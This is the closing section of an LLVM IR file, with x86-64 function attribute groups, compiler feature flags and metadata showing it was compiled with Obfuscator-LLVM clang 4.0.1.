attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #8 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #9 = { nounwind readonly }
attributes #10 = { nounwind readnone }
attributes #11 = { noreturn }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
!1 = !{i32 -2146509988}
!2 = !{i32 -2146508860}
!3 = !{i32 -2146508169}
!4 = !{i32 -2146507420}
!5 = !{i32 -2146506481}
!6 = !{i32 -2146505392}
